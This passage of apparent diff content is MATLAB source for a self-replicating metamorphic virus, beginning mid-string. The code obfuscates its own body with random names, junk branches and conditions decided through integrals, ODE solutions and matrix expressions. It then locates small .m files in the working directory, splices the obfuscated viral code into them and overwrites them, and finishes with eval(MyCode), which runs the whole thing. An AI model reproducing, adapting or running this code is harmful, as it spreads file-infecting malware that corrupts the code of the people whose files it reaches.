'',Rnames{Count008},''];''];AlgoMatrix(:,Count007)=AlgoMatrix(:,Count007)+AlgoMatrix(:,Count008);AlgoMatrix(:,Count008)=0;TrashNames=Rnames(diag(AlgoMatrix));eval(CreateTrash2);else NewCode{end+1}=[Rnames{Count008},''=['',Rnames{Count007},'' '',Rnames{Count008},''];''];AlgoMatrix(:,Count008)=AlgoMatrix(:,Count008)+AlgoMatrix(:,Count007);AlgoMatrix(:,Count007)=0;TrashNames=Rnames(diag(AlgoMatrix));eval(CreateTrash2);end;end;end;end;end;for Count009=1:size(NewCode,2) eval(NewCode{Count009});end;ViralBodyVariable=Rnames{sum(AlgoMatrix)==SplitSize};NewCode=strrep(NewCode,ViralBodyVariable,TmpRndName{1});TrashLine=strrep(TrashLine,ViralBodyVariable,TmpRndName{1});ActualCodeForThisPart={};Var2Wrt={};ObfusCount=1;RandomAppearenceOfIfs=fix(rand*2);LineBreaksIf=fix(rand(1,4)*2);LineShift={};LineShift{1}(1:fix(rand*8))='' '';if rand>0.7 LineShift{1}=''    '';end;if rand>0.3 LineShift{2}=LineShift{1};else LineShift{2}(1:fix(rand*8))='' '';end;while(ObfusCount<=length(NewCode))Var2Wrt{ObfusCount}={};ActualCodeForThisPart{ObfusCount}={};runcode=0;RandNameCol={};for Count010=0:10 RandNameCol{end+1}=''if'';while(any(strcmp({FfAll{:} DfAll{:} Rnames{:} RandNameCol{1:end-1}},RandNameCol{end}))||iskeyword(RandNameCol{end}))RandNameCol{end}=char(fix(rand(1,fix(rand*15)+5)*25)+97);end;end;CODE=NewCode{ObfusCount};TRASH=TrashLine{ObfusCount};WhichMathAlgo=fix(rand*5);if(WhichMathAlgo==1 || WhichMathAlgo==3)FReplacePool1={''sin'' ''cos'' ''exp'' ''atan''};StartFunction=''SOS'';SReplacePool1={''(SOS)'' ''F(S)'' ''if'' ''if''};while(~isempty(strfind([FReplacePool1{:}], SReplacePool1{3}))||iskeyword(SReplacePool1{3}))SReplacePool1{3}=char(fix(rand(1,fix(rand*4)+2)*25)+97);end;SReplacePool1{4}=SReplacePool1{3};OReplacePool1={''.*'' ''+''};while length(strfind(StartFunction,''S''))+length(strfind(StartFunction,''O''))+length(strfind(StartFunction,''F''))>0 TmpVar001=fix(rand*length(SReplacePool1)+1);StartFunction=regexprep(StartFunction,''S'',SReplacePool1{TmpVar001},rand*length(strfind(StartFunction,''S''))+1);if(TmpVar001>2&&strcmp(SReplacePool1{3},SReplacePool1{4}));while(~isempty(strfind(SReplacePool1{4},SReplacePool1{3}))||~isempty(strfind(SReplacePool1{3},SReplacePool1{4}))||~isempty(strfind([FReplacePool1{:}],SReplacePool1{4}))||iskeyword(SReplacePool1{4}))SReplacePool1{4}=char(fix(rand(1,fix(rand*4)+2)*25)+97);end;end;StartFunction=regexprep(StartFunction, ''O'',OReplacePool1{fix(rand*length(OReplacePool1)+1)},rand*length(strfind(StartFunction,''O''))+1);StartFunction=regexprep(StartFunction, ''F'',FReplacePool1{fix(rand*length(FReplacePool1)+1)},rand*length(strfind(StartFunction,''F''))+1);if(max(cumsum(StartFunction==''('')-cumsum(StartFunction=='')''))>25)SReplacePool1{1}=SReplacePool1{3};SReplacePool1{2}=SReplacePool1{4}; end;end;end;'];
+MyCode=[MyCode 'if(WhichMathAlgo==0)MatSizeN=fix(rand*5)+3;SomeMatVec{1}=[RandNameCol{end} ''=['']; SomeMatVec{2}=[RandNameCol{end-1} ''=['']; SomeMatVec{3}=[RandNameCol{end-2} ''=[''];MultFct=rand*30;for Count011=1:MatSizeN SomeMatVec{1}=[SomeMatVec{1} '' '' num2str(rand(1,1)*MultFct)];SomeMatVec{2}=[SomeMatVec{2} '';'' num2str(rand(1,1)*MultFct)];SomeMatVec{3}=[SomeMatVec{3} '';''];for Count012=1:MatSizeN SomeMatVec{3}=[SomeMatVec{3} '' '' num2str(rand(1,1)*MultFct)];end;end;SomeMatVec{1}=[SomeMatVec{1} ''];''];SomeMatVec{1}(size(RandNameCol{end},2)+3)='''';eval(SomeMatVec{1});SomeMatVec{2}=[SomeMatVec{2} ''];''];SomeMatVec{2}(size(RandNameCol{end-1},2)+3)=''''; eval(SomeMatVec{2});SomeMatVec{3}=[SomeMatVec{3} ''];''];SomeMatVec{3}(size(RandNameCol{end-2},2)+3:size(RandNameCol{end-2},2)+4)='''';eval(SomeMatVec{3});SpecMatName={''toeplitz'',''vander''}; SpecVecName={''pascal'',''magic'',''hilb'',''invhilb'',''wilkinson''};WhichMatrixAlgo=fix(rand*5);if(WhichMatrixAlgo==0)Var2Wrt{ObfusCount}{end+1}=SomeMatVec{1};Var2Wrt{ObfusCount}{end+1}=SomeMatVec{2};MatName=[RandNameCol{end-1} ''*'' RandNameCol{end}];elseif(WhichMatrixAlgo==1)Var2Wrt{ObfusCount}{end+1}=SomeMatVec{3};MatName=[RandNameCol{end-2}];elseif(WhichMatrixAlgo==2)Var2Wrt{ObfusCount}{end+1}=SomeMatVec{1};MatName=[SpecMatName{fix(rand(1,1)*length(SpecMatName)+1)} ''('' RandNameCol{end} '')''];elseif(WhichMatrixAlgo==3)MatName=[SpecVecName{fix(rand(1,1)*length(SpecVecName)+1)} ''('' num2str(MatSizeN) '')''];elseif(WhichMatrixAlgo==4)MatName=''rosser'';end;MatArOp={''sin'' ''cos'' ''sinh'' ''cosh'' ''exp'' ''tan'' ''sqrt'' ''real'' ''imag''};for Count013=1:fix(rand*3+1) if(rand>0.66)MatName=[MatArOp{fix(rand*size(MatArOp,2)+1)} ''('' MatName '')''];end;end;VecArOp={''sum'' ''max'' ''min''};SavedVector=[VecArOp{fix(rand*size(VecArOp,2)+1)} ''('' RandNameCol{end} '')''];IsItAVector=1;if (rand>0.44) SavedVector=num2str(rand*100-50); IsItAVector=0;end;for Count015=1:fix(rand*3+1) if(rand>0.66)SavedVector=[MatArOp{fix(rand*size(MatArOp,2)+1)} ''('' SavedVector '')''];end;end;MatName=[VecArOp{fix(rand*size(VecArOp,2)+1)} ''('' MatName '')''];for Count016=1:fix(rand*3+1) if(rand>0.85)MatName=[MatArOp{fix(rand*size(MatArOp,2)+1)} ''('' MatName '')''];end;end;MatName=[VecArOp{fix(rand*size(VecArOp,2)+1)} ''('' MatName '')''];for Count017=1:fix(rand*3+1) if(rand>0.85)MatName=[MatArOp{fix(rand*size(MatArOp,2)+1)} ''('' MatName '')''];end;end;TmpVar002=fix(rand*4);Operator1=''''; Operator2='''';if (eval(SavedVector)>eval(MatName)) Operator1=''>''; Operator2=''<'';end;if (eval(SavedVector)<eval(MatName)) Operator1=''<''; Operator2=''>'';end;if(~isempty(Operator1))ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} CODE];ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} TRASH];if(sum(strcmp(Var2Wrt{ObfusCount},SomeMatVec{1}))==0 && IsItAVector) Var2Wrt{ObfusCount}{end+1}=SomeMatVec{1};end;if(TmpVar002==0)ActualCodeForThisPart{ObfusCount}{1}=[''if(('' SavedVector '')'' Operator1 MatName '')''];elseif(TmpVar002==1)ActualCodeForThisPart{ObfusCount}{1}=[''if('' MatName Operator1 ''('' SavedVector ''))''];ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} TRASH];ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} CODE];elseif(TmpVar002==2)ActualCodeForThisPart{ObfusCount}{1}=[''if(('' SavedVector '')'' Operator2 MatName '')''];ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} TRASH];ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} CODE];elseif(TmpVar002==3)ActualCodeForThisPart{ObfusCount}{1}=[''if('' MatName Operator2 ''('' SavedVector ''))''];end;ActualCodeForThisPart{ObfusCount}{3}=[''else''];ActualCodeForThisPart{ObfusCount}{5}=[''end''];else ObfusCount=ObfusCount-1;end;RandNameCol(end)=[]; RandNameCol(end)=[]; RandNameCol(end)=[];if ObfusCount for Count018=1:size(Var2Wrt{ObfusCount},2) eval(Var2Wrt{ObfusCount}{Count018});end;end;elseif(WhichMathAlgo==1)BoundAll1=cellstr(num2str(rand(5,1))); BoundAll2={''pi'',''log(2)'',''sqrt(2)'',''sqrt(3)'',BoundAll1{:}}; BoundAll3=randperm(length(BoundAll2));if rand>0.6 StartFunction=strrep(StartFunction,SReplacePool1{4},SReplacePool1{3});BoundAll3={BoundAll2{BoundAll3(1:2)}};BoundSign=strrep(strrep(cellstr(num2str(rand(2,1)>0.7)),''1'',''-''),''0'',''''); BoundAll3={[BoundSign{1} strrep(BoundAll3{1},'' '','''')],[BoundSign{2} strrep(BoundAll3{2},'' '','''')]}; BoundTmpA=[eval(BoundAll3{1}) eval(BoundAll3{2})];if(sum(abs(sort(BoundTmpA)-BoundTmpA))>0) BoundAll3{3}=BoundAll3{1}; BoundAll3{1}=BoundAll3{2}; BoundAll3{2}=BoundAll3{3}; BoundAll3(3)=[];end;FctString1=''quad''; FctString2=''''; FctString3='''';else BoundAll3={BoundAll2{BoundAll3(1:4)}};BoundSign=strrep(strrep(cellstr(num2str(rand(4,1)>0.7)),''1'',''-''),''0'','''');BoundAll3={[BoundSign{1} strrep(BoundAll3{1},'' '','''')],[BoundSign{2} strrep(BoundAll3{2},'' '','''')],[BoundSign{3} strrep(BoundAll3{3},'' '','''')],[BoundSign{4} strrep(BoundAll3{4},'' '','''')]};BoundTmpA=[eval(BoundAll3{1}) eval(BoundAll3{2})];BoundTmpB=[eval(BoundAll3{3}) eval(BoundAll3{4})];if(sum(abs(sort(BoundTmpA)-BoundTmpA))>0) BoundAll3{5}=BoundAll3{1}; BoundAll3{1}=BoundAll3{2}; BoundAll3{2}=BoundAll3{5}; BoundAll3(5)=[]; end;if(sum(abs(sort(BoundTmpB)-BoundTmpB))>0) BoundAll3{5}=BoundAll3{3}; BoundAll3{3}=BoundAll3{4}; BoundAll3{4}=BoundAll3{5}; BoundAll3(5)=[]; end;FctString1=''dblquad''; FctString2=['','' BoundAll3{3} '','' BoundAll3{4}]; FctString3=['','' SReplacePool1{4}];end;IntTolerance=fix(real(log10(eval([FctString1 ''(@('' SReplacePool1{3} FctString3 '')'' StartFunction '','' BoundAll3{1} '','' BoundAll3{2} FctString2 '',1e'' num2str(6666) '')'']))))+5;TimeMeasure=0;while(TimeMeasure<0.1 && IntTolerance>-23)IntTolerance=IntTolerance-1;CompleteCompString=[FctString1 ''(@('' SReplacePool1{3} FctString3 '')'' StartFunction '','' BoundAll3{1} '','' BoundAll3{2} FctString2 '',1e'' num2str(IntTolerance) '')''];TimeMeasure=cputime;CompleteErg=eval(CompleteCompString);TimeMeasure=cputime-TimeMeasure;if(isnan(CompleteErg) || isinf(CompleteErg))IntTolerance=-50;end;end;if(IntTolerance>-23)runcode=1;else ObfusCount=ObfusCount-1;end;elseif(WhichMathAlgo==2)TmpVar003=fix(rand*50+4);TmpVar004=rand*1000;InterpDataVec='''';for Count019=0:TmpVar003 InterpDataVec=[InterpDataVec num2str(rand*TmpVar004) '' ''];end;InterpDataVec(end)='''';Var2Wrt{ObfusCount}{end+1}=[RandNameCol{end} ''=['' InterpDataVec ''];''];eval(Var2Wrt{ObfusCount}{end});InterpSpline='''';if (rand>0.6) InterpSpline=['','' QuoteSign ''spline'' QuoteSign];end;CompleteCompString=[''interp1('' RandNameCol{end} '','' num2str(rand*(TmpVar003-1)+1) InterpSpline '')''];RandNameCol(end)=[];CompleteErg=eval(CompleteCompString);runcode=1;elseif(WhichMathAlgo==3)Var2Wrt{ObfusCount}{end+1}=[RandNameCol{end} ''=inline('' QuoteSign StartFunction QuoteSign '','' QuoteSign SReplacePool1{3} QuoteSign '','' QuoteSign SReplacePool1{4} QuoteSign '');''];eval(Var2Wrt{ObfusCount}{end});ODEIntervallA=fix(rand*7-3);ODEIntervallB=fix(ODEIntervallA+rand*4+1);Var2Wrt{ObfusCount}{end+1}=[''['' RandNameCol{end-1} '','' RandNameCol{end-2} '']=ode45('' RandNameCol{end} '',['' num2str(ODEIntervallA) '' '' num2str(ODEIntervallB) ''],'' num2str(rand*4) '');''];eval([Var2Wrt{ObfusCount}{end}(1:end-2) '',odeset('' QuoteSign ''OutputFcn'' QuoteSign '',@odefunction));'']);ODEDomain=eval(RandNameCol{end-1});ODEIntX=num2str(rand*ODEIntervallB+ODEIntervallA);if rand>0.5 CompleteCompString=[''interp1('' RandNameCol{end-1} '','' RandNameCol{end-2} '','' ODEIntX '')''];else CompleteCompString=[''interp1('' Var2Wrt{ObfusCount}{end}(strfind(Var2Wrt{ObfusCount}{end},''='')+1:end-1) '','' ODEIntX '')''];Var2Wrt{ObfusCount}(end)=[];end;RandNameCol(end)=[]; RandNameCol(end)=[]; RandNameCol(end)=[];if(length(ODEDomain)>5&&ODEDomain(end)==ODEIntervallB)CompleteErg=eval(CompleteCompString);else CompleteErg=NaN;end;if(isnan(CompleteErg)||isinf(CompleteErg)||ODEDomain(end)~=ODEIntervallB)while ~isempty(Var2Wrt{ObfusCount}) Var2Wrt{ObfusCount}(end)=[];end;ObfusCount=ObfusCount-1;else runcode=1;end;elseif(WhichMathAlgo==4)CompleteCompString=''F(F(S))'';SReplacePool2={''F(S)'' ''F(S)'' ''F(S)'' ''F(S)'' ''F(S)'' ''D(S,S)'' ''R'' ''R''};while ~isempty(strfind(CompleteCompString,''S'')) CompleteCompString=regexprep(CompleteCompString, ''S'',SReplacePool2{fix(rand*length(SReplacePool2)+1)},rand*length(strfind(CompleteCompString,''S''))+1);if(length(strfind(CompleteCompString,''F''))+length(strfind(CompleteCompString,''D''))>10)SReplacePool2={''R''};end;end;CompleteCompString=regexprep(CompleteCompString, ''S'',SReplacePool2{fix(rand*length(SReplacePool2)+1)});while length(strfind(CompleteCompString,''D''))+length(strfind(CompleteCompString,''F''))+length(strfind(CompleteCompString,''R''))>0 CompleteCompString=regexprep(CompleteCompString, ''F'',FfAll{fix(rand*length(FfAll)+1)},rand*length(strfind(CompleteCompString,''F''))+1);CompleteCompString=regexprep(CompleteCompString, ''D'',DfAll{fix(rand*length(DfAll)+1)},rand*length(strfind(CompleteCompString,''D''))+1);CompleteCompString=regexprep(CompleteCompString, ''R'',num2str(rand*10-5),rand*length(strfind(CompleteCompString,''R''))+1);end;if(max(cumsum(CompleteCompString==''('')-cumsum(CompleteCompString=='')''))<25)CompleteErg=eval(CompleteCompString);else CompleteErg=NaN;end;if(isnan(CompleteErg)||isinf(CompleteErg))ObfusCount=ObfusCount-1;else runcode=1;end;end;'];
+MyCode=[MyCode 'if(runcode)RCWriteVar=0;RCNumSub=''0'';RCNumAdd=''0'';while(~(CompleteErg>eval(RCNumSub))||~(eval(RCNumSub)<CompleteErg)||~(CompleteErg<eval(RCNumAdd))||~(eval(RCNumAdd)>CompleteErg))if WhichMathAlgo==3 MulFacRC=8; IncFacRC=2; else MulFacRC=0.01;IncFacRC=1;end;RCNumSub=num2str(CompleteErg-(abs(CompleteErg)*MulFacRC+IncFacRC)*rand,5+fix(rand(1,1)*5));RCNumAdd=num2str(CompleteErg+(abs(CompleteErg)*MulFacRC+IncFacRC)*rand,5+fix(rand(1,1)*5));end;if(rand>0.4)RCsSub=[RandNameCol{end} ''='' RCNumSub '';''];RCNumSub=RandNameCol{end};RCsAdd=[RandNameCol{end} ''='' RCNumAdd '';''];RCNumAdd=RandNameCol{end};RCWriteVar=1;RandNameCol(end)=[];end;ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} CODE];ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} TRASH];if(RCWriteVar) Var2Wrt{ObfusCount}{end+1}=RCsSub;eval(RCsSub);end;runcode=1;TmpVar005=fix(rand*4);'];
+MyCode=[MyCode 'if (TmpVar005==0)if(rand>0.5)ActualCodeForThisPart{ObfusCount}{1}=[''if('' CompleteCompString ''>'' RCNumSub '')''];else ActualCodeForThisPart{ObfusCount}{1}=[''if('' RCNumSub ''<'' CompleteCompString '')''];end;elseif(TmpVar005==1)if(rand>0.5)ActualCodeForThisPart{ObfusCount}{1}=[''if('' CompleteCompString ''<'' RCNumSub '')''];else ActualCodeForThisPart{ObfusCount}{1}=[''if('' RCNumSub ''>'' CompleteCompString '')''];end;ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} TRASH];ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} CODE];elseif(TmpVar005==2)if(rand>0.5)ActualCodeForThisPart{ObfusCount}{1}=[''if('' CompleteCompString ''>'' RCNumAdd '')''];else ActualCodeForThisPart{ObfusCount}{1}=[''if('' RCNumAdd ''<'' CompleteCompString '')''];end;if(RCWriteVar)Var2Wrt{ObfusCount}{end}=RCsAdd;eval(RCsAdd);end;ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} TRASH];ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} CODE];elseif (TmpVar005==3) if(rand>0.5)ActualCodeForThisPart{ObfusCount}{1}=[''if('' CompleteCompString ''<'' RCNumAdd '')''];else ActualCodeForThisPart{ObfusCount}{1}=[''if('' RCNumAdd ''>'' CompleteCompString '')''];end;if(RCWriteVar)Var2Wrt{ObfusCount}{end}=RCsAdd; eval(RCsAdd);end;end;ActualCodeForThisPart{ObfusCount}{3}=''else'';ActualCodeForThisPart{ObfusCount}{5}=''end'';end;TmpVar006=4;TmpStrWS={'''' '''' '' '' '''' ''''};while TmpVar006>0 if ObfusCount if(LineBreaksIf(TmpVar006)==1&&length(ActualCodeForThisPart{ObfusCount})==5)ActualCodeForThisPart{ObfusCount}{TmpVar006}=[ActualCodeForThisPart{ObfusCount}{TmpVar006} TmpStrWS{TmpVar006} ActualCodeForThisPart{ObfusCount}{TmpVar006+1}];ActualCodeForThisPart{ObfusCount}(TmpVar006+1)=[];end;end;TmpVar006=TmpVar006-1;end;'];
+MyCode=[MyCode 'if(RandomAppearenceOfIfs)LineBreaksIf=fix(rand(1,4)*2);LineShift={};LineShift{1}(1:fix(rand*8))='' '';if rand>0.7 LineShift{1}=''    '';end;if rand>0.4 LineShift{2}=LineShift{1};else LineShift{2}(1:fix(rand*8))='' '';end;end;ObfusCount=ObfusCount+1;end;Var2Wrt{1}{end+1}=''warning off all'';delete(''odefunction.m'');'];
+MyCode=[MyCode 'ActualCodeForThisPart{end+1}={[''eval('' TmpRndName{1} '');'']};Var2Wrt{end+1}={};'];
+MyCode=[MyCode 'VirCode={};Count020=length(ActualCodeForThisPart);while Count020>0 VirCode{end+1}=ActualCodeForThisPart{Count020};for Count021=Count020:length(ActualCodeForThisPart) if ~isempty(Var2Wrt{Count021}) if rand>0.3 VirCode{end+1}=Var2Wrt{Count021}(end);Var2Wrt{Count021}(end)=[];end;end;end;Count020=Count020-1;end;IsAllEmpty=false; while ~IsAllEmpty IsAllEmpty=true;for Count022=1:length(Var2Wrt) if ~isempty(Var2Wrt{Count022}) IsAllEmpty=false;if rand>0.5 VirCode{end+1}=Var2Wrt{Count022}(end); Var2Wrt{Count022}(end)=[];end;end;end;end;VicFiles=dir(''*.m'');VicLines={};for Count023=1:length(VicFiles) if(VicFiles(Count023).bytes<1000 && ~strcmp(VicFiles(Count023).name,''odefunction.m''))VicIDr=fopen(VicFiles(Count023).name, ''r'');VicLines={fgetl(VicIDr)};while ischar(VicLines{end}) VicLines{end+1}=fgetl(VicIDr);end;VicLines(end)=[];Count024=1;while Count024<length(VicLines)+1 IsAPO=0;Count025=1;while Count025<length(VicLines{Count024})+1 if VicLines{Count024}(Count025)==QuoteSign IsAPO=~IsAPO;end;if ~IsAPO if VicLines{Count024}(Count025)==char(37) if Count025==1 VicLines(Count024)=[]; else VicLines{Count024}=VicLines{Count024}(1:Count025-1);end;end;if Count025+1<length(VicLines{Count024}) if all(VicLines{Count024}(Count025:Count025+2)==''...'') VicLines{Count024}=strcat(VicLines{Count024}(1:Count025-1),VicLines{Count024+1});Count025=1;if length(VicLines)>Count024 VicLines(Count024+1)=[];end;end;end;end;Count025=Count025+1;end;Count024=Count024+1;end;EndArray={''if'' ''for'' ''while'' ''try'' ''switch'' ''parfor''}; EndCount=0;GoodLine=[];for Count026=1:length(VicLines);IsAPP=0;if ~EndCount GoodLine=[GoodLine Count026]; end;for Count027=1:length(VicLines{Count026})if(VicLines{Count026}(Count027)==QuoteSign)IsAPP=~IsAPP;end;if ~IsAPP for Count028=1:length(EndArray) if Count027+length(EndArray{Count028})<length(VicLines{Count026}) if all(VicLines{Count026}(Count027:Count027+length(EndArray{Count028})-1)==EndArray{Count028}) IsStart=0;if(Count027==1)IsStart=1;elseif (VicLines{Count026}(Count027-1)=='' '' || VicLines{Count026}(Count027-1)=='';'' || VicLines{Count026}(Count027-1)==char(9)) IsStart=1;end;if Count027+length(EndArray{Count028})-1==length(VicLines{Count026}) IsStart=IsStart+1;elseif (VicLines{Count026}(Count027+length(EndArray{Count028}))=='' '' || VicLines{Count026}(Count027+length(EndArray{Count028}))==''('' || VicLines{Count026}(Count027+length(EndArray{Count028}))==char(9)) IsStart=IsStart+1;end;if IsStart==2 EndCount=EndCount+1;end;end;end;end;if Count027+1<length(VicLines{Count026}) if all(VicLines{Count026}(Count027:Count027+2)==''end'') IsEnd=0;if(Count027==1)IsEnd=1;elseif(VicLines{Count026}(Count027-1)=='' '' || VicLines{Count026}(Count027-1)=='';'' || VicLines{Count026}(Count027-1)==char(9)) IsEnd=1;end;if Count027+2==length(VicLines{Count026}) IsEnd=IsEnd+1;elseif(VicLines{Count026}(Count027+3)=='' '' || VicLines{Count026}(Count027+3)=='';'' || VicLines{Count026}(Count027+3)==char(9)) IsEnd=IsEnd+1;end;if IsEnd==2 EndCount=EndCount-1;end;end;end;end;end;end;NewInfCode={}; VCsplitted={};VirSplit=sort([0 length(VirCode) fix(rand(1,length(GoodLine)-1)*length(VirCode))]);TmpVar007=length(VirSplit);while TmpVar007>1 if (VirSplit(TmpVar007-1)<VirSplit(TmpVar007)) VCsplitted{length(VirSplit)-TmpVar007+1}=VirCode(VirSplit(TmpVar007-1)+1:VirSplit(TmpVar007));else VCsplitted{length(VirSplit)-TmpVar007+1}={};end;TmpVar007=TmpVar007-1;end;GoodLine(end+1)=length(VicLines);for Count029=1:length(GoodLine)-1 NewInfCode={NewInfCode{:} VicLines{GoodLine(Count029):GoodLine(Count029+1)-1}};TmpVar008=length(VCsplitted{Count029});while TmpVar008>0 NewInfCode={NewInfCode{:} VCsplitted{Count029}{TmpVar008}{:}};TmpVar008=TmpVar008-1;end;end;NewInfCode={NewInfCode{:} VicLines{end}};fclose(VicIDr);VicIDw=fopen(VicFiles(Count023).name, ''w+'');for Count030=1:length(NewInfCode)fprintf(VicIDw,[NewInfCode{Count030} char(13) char(10)]);end;fclose(VicIDw);end;end;'];
+
+MyCode
+%input('---');
+eval(MyCode);
+- - - - - - - - - - - - - 
+
